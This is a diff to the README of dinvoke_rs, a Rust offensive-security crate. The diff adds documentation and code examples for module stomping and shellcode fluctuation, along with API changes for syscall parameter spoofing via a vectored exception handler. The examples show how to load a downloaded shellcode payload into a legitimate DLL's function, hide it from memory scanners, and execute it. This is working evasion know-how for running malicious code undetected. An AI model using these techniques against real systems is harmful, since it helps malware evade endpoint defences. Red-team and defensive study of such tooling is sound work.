@@ -11,6 +11,7 @@ Features:
 * Map PE modules into sections backed by arbitrary modules on disk. **Not Opsec**
 * Module fluctuation to hide mapped PEs (concurrency supported). **Not Opsec**
 * Syscall parameters spoofing through exception filter + hardware breakpoints. **x64 only**
+* Module stomping and shellcode fluctuation.
 
 # Credit
 All the credits go to the creators of the original C# implementation of this tool:
@@ -27,6 +28,7 @@ All the credits go to the creators of the original C# implementation of this too
 - [Overload memory section](#Overload-memory-section)
 - [Module fluctuation](#Module-fluctuation)
 - [Use hardware breakpoints to spoof syscall parameters](#Syscall-parameters-spoofing)
+- [Module stomping and Shellcode fluctuation](#Module-stomping-and-Shellcode-fluctuation)
 
 # Usage
 
@@ -34,7 +36,7 @@ Import this crate into your project by adding the following line to your `cargo.
 
 ```rust
 [dependencies]
-dinvoke_rs = "0.1.2"
+dinvoke_rs = "0.1.3"
 ```
 
 # Examples
@@ -172,7 +174,7 @@ fn main() {
     unsafe 
     {
 
-        let ntdll: (PeMetadata, isize) = dinvoke_rs::manualmap::read_and_map_module("C:\\Windows\\System32\\ntdll.dll").unwrap();
+        let ntdll: (PeMetadata, isize) = dinvoke_rs::manualmap::read_and_map_module("C:\\Windows\\System32\\ntdll.dll", true).unwrap();
 
         let func_ptr:  unsafe extern "system" fn (u32, u8, u8, *mut u8) -> i32; // Function header available at data::RtlAdjustPrivilege
         let ret: Option<i32>; // RtlAdjustPrivilege returns an NSTATUS value, which is an i32
@@ -279,7 +281,7 @@ fn main() {
         }
 
         // Since we dont want to use our ntdll copy for the moment, we hide it again. It can we remapped at any time.
-        let _ = manager.hide(overload.1 as i64);
+        let _ = manager.hide_module(overload.1 as i64);
 
     }
 }
@@ -293,7 +295,7 @@ For now, this feature is implemented for the functions NtOpenProcess, NtAllocate
 
 ```rust
 
-use dinvoke_rs::data::{THREAD_ALL_ACCESS, CLIENT_ID};
+use dinvoke_rs::data::{THREAD_ALL_ACCESS, ClientId};
 use windows::{Win32::Foundation::HANDLE, Wdk::Foundation::OBJECT_ATTRIBUTES};
 
 fn main() {
@@ -301,10 +303,9 @@ fn main() {
     {
         // We active the use of hardware breakpoints to spoof syscall parameters
         dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
-        // We get the memory address of our function and set it as the 
-        // top-level exception handler.
+        // We get the memory address of our function and set it as a VEH
         let handler = dinvoke::breakpoint_handler as usize;
-        dinvoke_rs::dinvoke::set_unhandled_exception_filter(handler);
+        dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);
 
         let h = HANDLE {0: -1};
         let handle: *mut HANDLE = std::mem::transmute(&h);
@@ -321,7 +322,66 @@ fn main() {
         let ret = dinvoke::nt_open_process(handle, access, attributes, client_id);
 
         println!("NTSTATUS: {:x}", ret);
+
+        dinvoke_rs::dinvoke::use_hardware_breakpoints(false);
     }
 }
 
+```
+
+## Module stomping and Shellcode fluctuation
+Dinvoke_rs's overload crate now allows to perform module stomping by calling the `managed_module_stomping()` function. The first parameter of this function is the shellcode's content. The other two parameters modify the behaviour of the function, allowing three different execution paths commented below.
+
+The best way to use this function in my opinion is by loading a legitimate dll into the process and allow Dinvoke to determine a good spot in that dll to stomp your shellcode to it. This is done by passing the dll's base address as the third parameter of `managed_module_stomping()`. The second argument must be zero. By doing this, Dinvoke will iterate over the dll's Exception data looking for a legitimate function big enough to stomp the shellcode on it.
+
+```rust
+let payload_content = download_function();
+let my_dll = dinvoke_rs::dinvoke::load_library_a("somedll.dll");
+let module = dinvoke_rs::overload::managed_module_stomping(&payload_content, 0, my_dll);
+
+match module {
+     Ok(x) => println!("The shellcode has been written to 0x{:X}.", x.1),
+     Err(e) => println!("An error has occurred: {}", e),      
+}
+```
+
+You can also specify the exact location where you want the shellcode to be stomped to by passing the address as the second parameter:
+
+```rust
+let payload_content = download_function();
+let my_dll = dinvoke_rs::dinvoke::load_library_a("somedll.dll");
+let my_big_enough_function = dinvoke_rs::dinvoke::get_function_address(my_dll, "somefunction");
+let module = overload::managed_module_stomping(&payload_content, my_big_enough_function, 0);
+
+match module {
+     Ok(x) => println!("The shellcode has been written to 0x{:X}.", x.1),
+     Err(e) => println!("An error has occurred: {}", e),      
+}
+```
+
+Finally, you can allow Dinvoke to automatically decide the address where the shellcode will be stomped to. This is done by iterating over the Exception data of all loaded modules until finding a suitable function. This option may bring unexpected behaviours, so I do not really recommend it unless you don't have other option.
+```rust
+let payload_content = download_function();
+let module = dinvoke_rs::overload::managed_module_stomping(&payload_content, 0, 0);
+
+match module {
+    Ok(x) => println!("The shellcode has been written to 0x{:X}.", x.1),
+    Err(e) => println!("An error has occurred: {}", e),      
+}
+```
+
+Once the shellcode has been stomped, you can use dmanager crate to hide/restomp your shellcode, allowing to perfom shellcode fluctuation:
+
+```rust
+let payload_content = download_function();
+let my_dll = dinvoke::load_library_a("somedll.dll");
+let overload = overload::managed_module_stomping(&payload_content, 0, my_dll).unwrap();
+let mut manager = dmanager::Manager::new();
+let _r = manager.new_shellcode(overload.1, payload_content, overload.0).unwrap(); // The manager will take care of the fluctuation process
+let _r = manager.hide_shellcode(overload.1).unwrap(); // We restore the memory's original content and hide our shellcode
+ ... 
+let _r = manager.stomp_shellcode(overload.1).unwrap(); // When we need our shellcode's functionality, we restomp it to the same location so we can execute it
+let run: unsafe extern "system" fn () = std::mem::transmute(overload.1);
+run();
+let _r = manager.hide_shellcode(overload.1).unwrap(); // We hide the shellcode again
 ```
